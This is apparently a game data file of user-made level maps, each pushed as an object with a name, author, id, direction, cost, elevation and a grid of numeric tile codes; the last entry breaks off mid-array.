maps.push({name="Funny Face",author="TF2 Pencil",id="#1664179251",direction="forward",cost=328,elevation=-8,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,144,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,144,144,19,19,19,19,19,19,144,19,19,19,0,0,0,0,0,0,0,144,144,19,144,144,19,19,19,19,19,144,19,19,19,0,0,0,0,0,144,144,19,19,144,144,19,19,19,19,19,19,144,19,19,0,0,0,0,0,144,144,19,19,19,19,19,19,19,19,19,19,144,19,19,0,0,0,0,0,144,144,19,19,19,19,19,144,144,19,19,19,144,19,19,0,0,0,0,0,144,144,19,19,19,19,19,144,144,19,19,19,144,19,19,0,0,0,0,0,144,144,19,19,19,19,19,19,19,19,19,19,144,19,19,0,0,0,0,0,144,144,19,19,144,144,19,19,19,19,19,19,144,19,19,0,0,0,0,0,0,144,144,19,144,144,19,19,19,19,19,144,19,19,19,0,0,0,0,0,0,0,144,144,19,19,19,19,19,19,144,19,19,19,0,0,0,0,0,0,0,0,0,144,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,144,19,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Rainbow Floor",author="TF2 Pencil",id="#1664179300",direction="forward",cost=398,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,119,119,19,55,55,19,39,39,19,128,128,19,66,66,19,144,144,19,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="AroundForShortcut2",author="TF2 Pencil",id="#1664179540",direction="right",cost=161,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,24,24,2,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,9,9,24,24,2,0,0,0,0,0,0,0,9,9,1,1,1,1,1,1,1,1,24,24,0,0,0,0,30,30,0,0,9,9,9,9,96,9,9,9,9,3,24,24,0,0,0,0,30,30,0,0,9,9,9,9,96,9,9,9,9,3,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,31,31,0,36,36,0,37,37,0,40,40,42,42,0,24,24,0,0,0,0,31,31,0,36,36,0,37,37,0,0,0,42,42,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,32,32,0,35,35,0,38,38,0,40,40,42,42,0,24,24,0,0,0,0,32,32,0,35,35,0,38,38,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,33,33,0,34,34,0,39,39,0,40,40,42,42,44,24,24,0,0,0,0,33,33,0,34,34,0,39,39,0,40,40,42,42,44,24,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="AroundForShortcut3",author="TF2 Pencil",id="#1664179608",direction="forward",cost=181,elevation=-13,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,111,111,112,113,114,115,116,117,118,119,120,121,122,123,124,124,0,0,0,0,111,111,112,113,114,115,116,117,118,119,120,121,122,123,124,124,0,0,0,0,111,111,1,1,1,1,1,1,1,1,1,1,1,1,124,124,0,0,0,0,111,111,0,0,31,0,0,31,0,0,31,0,0,1,124,124,0,0,0,0,111,111,0,0,31,0,0,31,0,0,31,0,0,1,124,124,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,31,31,1,124,124,0,0,0,0,1,11,0,0,31,0,0,31,0,0,31,0,0,1,124,124,0,0,0,0,1,11,0,0,31,0,0,31,0,0,31,0,0,1,96,96,0,0,0,0,1,11,1,1,1,1,1,1,1,1,1,1,1,1,124,96,0,0,0,0,0,11,129,0,0,0,11,11,11,11,66,66,66,66,124,124,0,0,0,0,0,11,129,0,0,0,11,11,11,11,66,66,66,66,124,124,0,0,0,0,0,0,0,0,0,0,97,11,11,11,11,11,11,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0]});
maps.push({name="AroundForShortcut4",author="TF2 Pencil",id="#1664179638",direction="right",cost=203,elevation=14,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,131,9,9,9,9,9,9,9,9,9,9,9,0,0,0,1,1,1,1,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,1,132,35,1,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,1,35,35,1,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,1,35,35,1,0,0,0,3,3,0,0,0,0,0,0,0,0,0,0,0,1,131,133,1,0,0,0,23,23,23,23,23,23,23,23,23,23,23,2,0,1,1,1,1,0,0,0,23,23,23,23,23,23,23,23,23,23,23,2,0,1,134,35,1,0,0,0,0,0,0,0,23,23,23,23,23,23,0,0,0,1,35,35,1,0,0,0,0,0,0,0,23,97,23,23,139,23,0,0,0,1,35,35,1,0,0,0,0,0,0,0,23,23,23,23,23,23,0,0,0,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,35,35,1,137,35,35,0,0,35,0,0,35,0,0,35,133,1,0,0,1,133,136,1,35,35,35,0,0,35,0,0,35,0,0,35,138,1,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="AroundForShortcut5",author="TF2 Pencil",id="#1664179672",direction="forward",cost=377,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,20,20,20,20,20,20,20,20,20,20,20,20,20,20,0,0,0,14,14,66,69,69,69,69,69,69,69,69,69,69,69,69,69,20,0,0,0,14,14,66,69,69,69,69,69,69,69,69,69,69,69,69,69,20,0,0,0,14,14,14,20,20,20,20,20,20,20,20,20,20,20,66,66,20,0,0,0,14,14,14,20,14,14,14,97,14,0,54,0,0,20,14,14,20,0,0,0,14,14,14,20,14,14,14,14,14,0,54,0,0,20,97,14,20,0,0,0,14,14,14,20,0,20,20,20,20,20,20,54,54,20,14,14,20,0,0,0,14,14,14,20,14,20,54,54,14,97,20,0,0,20,66,66,20,0,0,0,14,14,14,20,0,20,54,54,14,4,20,54,54,20,69,69,20,0,0,0,14,14,14,20,14,20,0,0,20,20,20,0,0,20,69,69,20,0,0,0,14,14,14,20,0,20,54,54,0,54,0,54,54,20,69,69,20,0,0,0,96,96,96,20,14,20,54,54,0,54,0,54,54,20,69,69,20,0,0,0,96,96,96,20,0,20,20,20,20,20,20,20,20,20,69,69,20,0,0,0,14,14,14,20,14,14,14,14,97,14,66,69,69,69,69,69,20,0,0,0,14,14,14,20,14,14,14,14,14,14,66,69,69,69,69,69,20,0,0,0,14,14,14,20,20,20,20,20,20,20,20,20,20,20,20,20,20,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="AroundForShortcut6",author="TF2 Pencil",id="#1664179722",direction="left",cost=208,elevation=0,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,141,14,14,14,14,0,14,14,0,0,0,0,0,1,9,9,9,9,9,9,141,14,14,14,14,0,14,14,0,0,0,0,0,1,1,1,1,1,9,9,0,0,0,0,0,0,0,0,0,0,2,9,9,9,0,0,0,1,9,9,9,9,9,9,9,1,14,14,0,0,2,9,9,9,0,0,0,1,9,9,9,9,9,9,9,1,0,0,0,0,0,0,9,9,0,0,0,1,1,1,1,1,1,9,9,1,14,14,0,0,0,0,9,9,0,0,0,0,0,0,0,0,1,9,9,1,0,0,0,0,0,9,9,9,9,9,9,9,9,9,9,9,9,96,96,1,14,14,0,0,0,9,66,66,9,9,9,9,9,9,9,9,9,96,96,1,0,0,0,0,0,9,66,66,9,0,0,1,1,1,1,1,1,1,1,1,14,14,0,0,0,9,66,66,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,66,66,9,19,19,19,19,19,19,19,19,4,14,14,14,14,0,0,0,9,66,66,9,19,19,19,19,19,19,19,19,4,14,14,14,14,0,0,0,9,9,9,9,0,0,0,19,97,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="More or Less Jumps",author="TF2 Pencil",id="#1664179816",direction="right",cost=204,elevation=6,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,13,13,0,1,19,19,19,19,19,19,19,19,19,19,19,19,19,2,0,0,13,13,0,1,19,19,19,19,19,19,19,19,19,19,19,19,19,2,0,0,13,13,0,1,19,19,1,0,0,1,19,0,1,0,0,1,0,0,0,0,13,13,0,1,19,19,1,0,0,1,0,19,1,19,19,1,0,0,0,0,13,13,0,1,19,19,1,0,0,1,19,0,1,0,0,1,0,0,0,0,13,13,0,1,19,19,1,0,0,1,0,19,1,19,19,1,0,0,0,0,13,131,0,1,19,19,1,1,126,1,19,0,1,0,0,1,0,0,0,0,0,0,0,1,0,0,1,19,19,1,0,19,1,19,19,1,0,0,0,0,0,0,0,1,0,0,1,0,0,1,19,0,1,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,1,0,19,1,19,19,1,0,0,0,0,0,0,0,1,0,0,1,0,0,1,19,0,1,0,0,1,0,0,0,0,0,0,0,1,126,126,1,126,19,1,0,19,1,19,19,1,0,0,0,0,0,0,0,1,19,19,1,19,19,1,19,19,1,19,19,1,0,0,0,0,0,0,0,1,19,132,1,19,132,1,19,132,1,19,132,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Climbs or Jumps",author="TF2 Pencil",id="#1664179868",direction="left",cost=230,elevation=12,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,22,22,1,1,1,1,1,1,1,1,1,1,1,0,10,10,0,0,0,0,22,96,22,141,12,12,12,12,12,12,12,12,1,0,10,10,0,0,0,0,22,96,22,141,12,12,12,12,12,12,12,12,1,0,10,10,0,0,0,0,22,22,1,1,1,1,1,1,1,1,12,132,1,0,10,10,0,0,0,0,99,22,22,4,12,12,12,12,12,12,12,12,1,0,10,10,0,0,0,0,22,22,22,4,12,12,12,12,12,12,12,12,1,0,10,10,0,0,2,22,22,22,1,1,1,1,1,1,1,1,1,1,1,0,10,10,0,0,2,22,22,22,1,1,1,1,1,1,1,1,1,1,1,0,131,131,0,0,0,0,22,22,0,42,42,40,40,34,34,12,12,12,1,0,0,0,0,0,0,0,97,22,0,42,42,38,38,36,36,12,12,12,1,0,0,0,0,0,0,0,22,22,1,1,1,1,1,1,1,1,12,132,1,0,0,0,0,0,0,0,22,98,22,22,21,20,20,125,16,12,12,12,1,0,0,0,0,0,0,0,22,98,22,22,21,20,20,16,16,125,12,12,1,0,0,0,0,0,0,0,22,22,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="some dangerous water",author="Frid",id="#1664195083",direction="forward",cost=347,elevation=12,map=[0,0,0,0,1,5,5,5,5,2,2,5,5,5,5,1,0,0,0,0,0,0,0,0,1,71,71,71,5,5,5,5,71,71,71,1,0,0,0,0,0,0,0,0,1,71,71,71,73,25,25,74,71,71,71,1,0,0,0,0,0,0,0,0,1,71,71,71,73,73,74,74,71,71,71,1,0,0,0,0,0,0,0,0,1,71,71,71,73,25,25,74,71,71,71,1,0,0,0,0,0,0,0,0,1,71,71,71,73,73,74,74,71,71,71,1,0,0,0,0,0,0,0,0,1,71,71,71,73,25,25,74,71,71,71,1,0,0,0,0,0,0,0,0,8,8,8,8,8,90,90,8,8,8,8,8,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,5,5,5,5,5,5,5,6,6,5,5,5,5,5,5,5,0,0,0,0,5,20,20,20,5,5,5,7,7,5,5,5,20,20,20,92,0,0,0,0,1,54,3,54,1,5,5,8,8,5,5,1,54,3,54,1,0,0,0,0,1,54,54,54,1,1,1,49,49,1,1,1,54,54,54,1,0,0,0,0,1,54,54,54,53,52,51,50,50,51,52,53,54,54,54,1,0,0,0,0,1,54,54,54,53,52,51,50,50,51,52,53,54,54,54,1,0,0,0,0,1,1,1,1,1,1,1,117,117,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,143,143,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,117,117,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Shortcut v6",author="sivi",id="#1664198207",direction="forward",cost=295,elevation=0,map=[0,0,0,0,0,0,0,0,10,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,10,10,10,15,15,15,0,0,0,0,0,0,0,0,0,0,0,15,5,94,5,96,5,94,5,15,0,0,0,0,0,0,0,0,0,0,0,15,87,5,5,96,5,5,87,15,0,0,0,0,0,0,0,0,0,0,0,15,5,5,5,96,5,5,5,15,0,0,0,0,0,0,0,0,0,0,0,15,5,5,5,96,5,5,5,15,0,0,0,0,0,0,0,0,0,0,0,15,87,5,5,96,5,5,87,15,0,0,0,0,0,0,15,15,15,15,15,15,5,5,5,96,5,5,5,15,15,15,15,15,15,0,15,5,5,91,5,91,5,5,10,10,10,5,5,91,5,91,5,5,15,0,15,89,5,91,5,91,5,5,10,97,10,5,5,91,5,91,5,89,15,0,15,5,5,91,5,91,5,5,10,10,10,5,5,91,5,91,5,5,15,0,15,91,91,15,15,15,15,15,96,96,96,15,15,15,15,15,91,91,15,0,15,5,5,5,5,98,5,5,10,10,10,5,5,98,5,5,5,5,15,0,15,89,5,99,5,98,5,3,10,93,10,3,5,98,5,99,5,89,15,0,15,5,5,5,5,98,5,5,10,10,10,5,5,98,5,5,5,5,15,0,15,15,15,15,15,15,15,15,10,93,10,15,15,15,15,15,15,15,15,0,0,0,0,0,0,0,0,15,10,10,10,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,10,2,2,15,0,0,0,0,0,0,0,0]});
maps.push({name="cade the doors",author="Frid",id="#1664198918",direction="right",cost=388,elevation=16,map=[1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,2,1,6,6,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,2,1,7,7,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,21,21,1,8,8,1,90,19,19,19,19,19,19,95,19,19,19,20,21,96,21,21,1,9,9,1,1,19,1,1,1,1,1,1,1,1,1,1,1,1,21,21,10,10,10,10,10,3,10,15,90,90,1,22,19,19,20,21,21,1,21,21,10,10,10,10,10,10,11,15,15,15,15,22,19,19,20,21,21,96,21,21,10,10,10,10,10,10,12,15,15,15,15,22,19,19,20,21,21,96,21,21,10,10,10,10,10,10,13,15,15,15,16,22,90,19,20,21,21,1,21,21,10,10,10,10,10,10,14,15,15,15,17,22,19,19,20,21,21,1,21,21,10,10,10,10,10,10,13,15,15,90,18,19,19,19,20,21,21,96,21,21,10,10,10,10,10,10,12,15,15,90,19,19,19,19,20,21,21,96,21,21,1,18,18,18,18,10,11,15,15,15,15,22,19,19,20,21,21,1,21,21,1,19,3,52,51,10,10,15,90,15,15,22,22,19,20,21,21,1,21,21,1,1,1,18,18,10,10,15,15,15,90,10,22,22,22,21,21,1,21,21,10,24,22,20,18,10,10,10,10,10,10,10,10,22,22,22,1,1,21,21,10,10,10,10,10,10,10,10,10,10,10,90,10,90,10,10,1,21,21,21,24,10,10,10,10,10,24,24,24,24,24,10,10,90,10,10,1,21,21,1,24,24,24,24,24,24,24,24,24,97,24,10,10,10,10,90,1,93,94,1]});
maps.push({name="Death Star",author="sivi",id="#1664201297",direction="right",cost=322,elevation=0,map=[0,0,1,7,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,7,7,7,1,1,1,1,1,131,1,1,1,1,5,133,5,1,0,0,1,7,7,7,7,14,17,17,7,33,7,7,1,1,5,5,5,1,0,0,1,7,7,7,7,14,17,17,7,7,7,7,1,1,93,5,93,1,0,0,1,7,7,7,7,14,14,14,7,7,7,7,1,1,5,5,5,1,0,0,1,7,7,7,7,7,7,7,7,7,7,7,1,1,5,5,5,1,0,0,1,7,7,7,7,7,7,7,7,7,10,10,1,1,5,132,5,1,0,0,1,7,7,7,5,5,5,90,5,7,10,10,1,1,1,1,1,1,0,0,1,7,7,7,5,0,0,0,5,7,7,139,1,1,0,0,0,0,0,0,1,7,7,7,5,0,0,0,5,7,139,126,33,1,0,0,0,0,0,0,1,7,7,7,5,0,0,0,5,7,7,139,1,1,0,0,0,0,0,0,1,7,7,7,5,90,5,5,5,7,7,7,1,1,1,1,1,1,0,0,1,7,7,7,7,7,7,7,7,7,7,7,95,107,107,107,107,2,0,0,1,7,7,7,7,7,7,7,7,7,7,7,95,107,107,107,107,2,0,0,1,7,7,7,7,7,7,7,7,7,7,7,1,1,1,1,1,1,0,0,1,7,7,7,7,7,7,7,7,7,7,134,1,0,0,0,0,0,0,0,1,7,11,11,7,7,11,7,7,7,139,126,1,0,0,0,0,0,0,0,1,7,9,11,7,7,11,7,47,7,139,33,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Welcome to Jurassic",author="Frid",id="#1664205808",direction="forward",cost=450,elevation=0,map=[1,1,1,1,1,1,1,1,93,2,2,94,1,1,1,1,1,1,1,1,1,5,5,5,5,90,5,5,11,45,45,11,5,5,90,5,5,90,5,1,1,5,5,5,5,90,90,5,11,45,45,11,5,5,5,90,5,5,5,1,1,5,5,90,5,5,5,5,11,45,45,11,5,5,5,5,5,5,90,1,1,5,5,5,5,5,5,5,10,5,5,10,5,5,5,5,5,5,5,1,1,5,90,5,90,5,5,5,9,5,5,9,5,5,5,90,5,5,5,1,1,5,5,5,5,5,5,5,8,5,5,8,5,5,5,5,5,90,5,1,1,5,5,5,90,5,5,5,5,5,5,5,5,5,5,90,5,5,5,1,1,90,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,90,1,1,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,5,5,1,1,5,5,5,5,90,5,5,5,5,5,5,90,5,5,5,5,90,5,1,1,5,90,5,5,5,5,5,90,5,5,5,5,5,90,5,5,5,5,1,1,5,5,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,1,1,90,5,5,5,5,5,5,5,90,5,5,5,5,5,5,90,5,5,1,1,5,5,5,5,90,5,5,5,5,5,5,90,5,5,5,5,5,90,1,1,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,1,1,97,5,90,5,5,90,5,5,5,5,5,5,90,5,5,90,5,97,1,1,1,1,1,1,1,1,1,96,96,96,96,1,1,1,1,1,1,1,1,1,5,90,5,90,5,5,5,5,5,5,5,5,5,5,90,5,5,90,1,1,5,90,5,5,5,90,5,5,2,2,5,5,90,5,5,90,5,5,1]});
maps.push({name="Park Jurassic",author="Frid",id="#1664205873",direction="forward",cost=505,elevation=0,map=[0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,0,0,0,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,1,0,0,0,1,14,3,14,14,14,14,14,14,14,14,14,14,14,3,14,1,0,0,0,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,0,0,0,1,54,54,65,65,65,65,65,65,65,65,65,65,65,65,65,1,0,0,0,1,54,54,54,54,54,54,54,65,65,65,65,65,65,65,65,1,0,0,0,1,54,54,54,54,54,54,54,65,65,54,54,54,54,54,54,1,0,0,0,1,65,65,65,65,65,65,65,65,65,54,54,54,54,54,54,1,0,0,0,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,0,0,0,1,55,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,0,0,0,1,65,65,65,65,65,65,65,65,54,54,54,54,54,54,54,1,0,0,0,1,54,54,54,54,54,54,65,65,54,54,54,54,54,54,54,1,0,0,0,1,54,54,54,54,54,54,65,65,65,65,65,65,65,65,65,1,0,0,0,1,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,1,0,0,0,1,65,65,65,65,65,65,21,24,65,65,65,65,65,65,65,1,0,0,0,1,65,65,65,65,65,65,65,22,65,65,65,65,65,65,65,1,0,0,0,1,65,65,65,65,65,65,14,91,14,65,65,65,65,65,65,1,0,0,0,1,65,65,65,65,65,14,91,3,91,14,65,65,65,65,65,1,0,0,0,1,24,24,24,24,24,24,24,24,24,24,24,2,2,24,24,1,0,0]});
maps.push({name="some kind of bathroo",author="sivi",id="#1664206971",direction="right",cost=449,elevation=7,map=[0,1,94,94,12,12,5,5,5,5,2,2,5,5,5,5,5,0,0,0,0,1,12,12,12,12,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,1,12,12,10,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,10,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,8,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,7,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,88,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,93,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,66,66,66,66,66,66,66,66,66,5,5,0,0,0,0,1,12,12,5,5,5,5,5,5,11,5,5,5,139,5,5,0,0,0,0,1,12,139,3,3,5,5,5,5,5,9,9,7,6,5,5,0,0,0,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,2,0,1,12,12,12,12,12,93,12,12,12,12,12,12,12,12,12,12,12,2,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="double tunnel hold",author="swarm",id="#1664217922",direction="forward",cost=231,elevation=4,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,0,0,10,10,0,0,0,0,0,0,0,0,0,0,1,112,112,110,110,110,10,10,10,10,0,0,0,0,0,0,0,0,0,0,1,131,112,110,110,110,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,1,1,110,110,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,110,110,1,0,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,1,110,110,1,0,0,0,0,0,0,1,110,110,110,113,132,1,0,0,0,1,110,110,1,1,0,0,0,0,1,1,110,110,110,113,113,1,0,0,0,1,110,110,110,110,10,10,10,10,110,110,110,110,1,1,1,0,0,0,0,1,110,110,110,110,10,10,10,10,110,110,110,110,1,0,0,0,0,0,0,1,103,103,1,1,0,10,10,0,1,1,1,1,0,0,0,0,0,0,0,1,110,110,1,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,1,133,110,1,0,0,10,10,10,0,0,0,18,0,20,0,22,0,0,0,0,1,1,0,0,0,10,10,10,10,3,18,24,0,0,92,24,97,0,1,1,0,0,0,0,0,96,96,0,1,1,1,24,0,0,0,0,0,1,134,57,1,1,54,14,14,12,12,14,14,54,54,23,1,0,0,0,0,1,57,57,57,57,54,14,14,12,12,14,14,54,54,114,114,0,0,0,0,1,57,57,57,57,54,14,14,114,114,114,114,54,54,114,94,0,0,0,0,0,1,1,1,1,54,14,14,114,114,114,114,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,20,93,0,0,0,0,0,0]});
maps.push({name="BoatEscape",author="swarm",id="#1664222091",direction="right",cost=518,elevation=8,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,10,10,10,10,10,1,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,9,9,10,10,1,11,5,66,66,66,5,3,66,66,66,66,66,66,66,66,9,9,5,11,1,11,66,5,5,5,66,66,66,66,66,66,66,66,66,66,9,9,66,11,1,11,66,66,9,9,92,66,5,66,66,66,66,66,66,66,9,9,66,11,1,11,66,66,9,9,92,66,5,5,5,5,5,5,5,5,9,9,66,66,1,11,66,66,8,8,66,66,66,66,66,66,66,66,66,66,5,5,66,66,1,11,66,66,8,8,5,66,66,66,66,66,66,66,66,66,66,66,66,11,1,11,66,66,8,8,66,11,11,11,11,11,66,66,11,11,11,11,11,11,1,11,66,66,8,8,66,11,1,1,1,1,1,1,1,1,1,1,1